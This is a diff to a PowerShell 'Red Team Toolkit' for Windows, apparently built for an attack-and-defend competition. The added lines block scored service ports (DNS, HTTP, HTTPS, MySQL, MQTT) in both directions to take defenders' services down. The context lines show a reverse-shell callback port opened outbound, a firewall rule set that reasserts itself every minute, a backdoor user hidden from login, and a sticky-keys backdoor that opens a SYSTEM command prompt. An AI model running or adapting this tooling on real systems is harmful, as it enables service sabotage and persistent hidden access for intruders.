@@ -21,19 +21,15 @@ Write-Host "=== Red Team Toolkit — Windows ===" -ForegroundColor Red
 # ============================================================
 Write-Host "[*] Locking down firewall..."
 
+# Access + AD ports only — scored service ports are deliberately NOT opened
 $AllowedTCPPorts = @(
     22,    # SSH
-    53,    # DNS
-    80,    # HTTP
     88,    # Kerberos
     135,   # RPC Endpoint Mapper
     389,   # LDAP
-    443,   # HTTPS
     445,   # SMB
     464,   # Kerberos password change
     636,   # LDAPS
-    1883,  # MQTT
-    3306,  # MySQL
     3389,  # RDP
     5985,  # WinRM HTTP
     5986,  # WinRM HTTPS
@@ -42,7 +38,6 @@ $AllowedTCPPorts = @(
 )
 
 $AllowedUDPPorts = @(
-    53,    # DNS
     67,    # DHCP server
     68,    # DHCP client
     88,    # Kerberos
@@ -50,6 +45,10 @@ $AllowedUDPPorts = @(
     389,   # LDAP
     464    # Kerberos password change
 )
+
+# Scored service ports — explicitly blocked even if someone adds allow rules
+$BlockedTCPPorts = @(53, 80, 443, 1883, 3306, 21)
+$BlockedUDPPorts = @(53)
 
 # Reset and default deny
 netsh advfirewall reset
@@ -75,6 +74,16 @@ foreach ($port in $AllowedTCPPorts) {
 foreach ($port in $AllowedUDPPorts) {
     Add-PortRule -Name "Allow UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port
     Add-PortRule -Name "Allow UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port
+}
+
+# Explicit block rules on scored service ports
+foreach ($port in $BlockedTCPPorts) {
+    New-NetFirewallRule -DisplayName "BLOCK TCP $port Inbound"  -Direction Inbound  -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
+    New-NetFirewallRule -DisplayName "BLOCK TCP $port Outbound" -Direction Outbound -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
+}
+foreach ($port in $BlockedUDPPorts) {
+    New-NetFirewallRule -DisplayName "BLOCK UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
+    New-NetFirewallRule -DisplayName "BLOCK UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
 }
 
 # Callback port outbound (reverse shells)
@@ -418,6 +427,7 @@ attrib +r +h $hostsFile
 Write-Host ""
 Write-Host "=== Toolkit deployed ===" -ForegroundColor Green
 Write-Host "Firewall:         Default deny all, allowed TCP: $($AllowedTCPPorts -join ', ') + callback $CallbackPort out"
+Write-Host "                  Explicitly blocked: $($BlockedTCPPorts -join ', ') (scored services)"
 Write-Host "                  FW-Persist task re-enables every 1 min, registry + ACL locked"
 Write-Host "Backdoor user:    $BackdoorUser / $BackdoorPass (hidden from login)"
 Write-Host "Sticky keys:      5x Shift on lock screen = SYSTEM cmd"
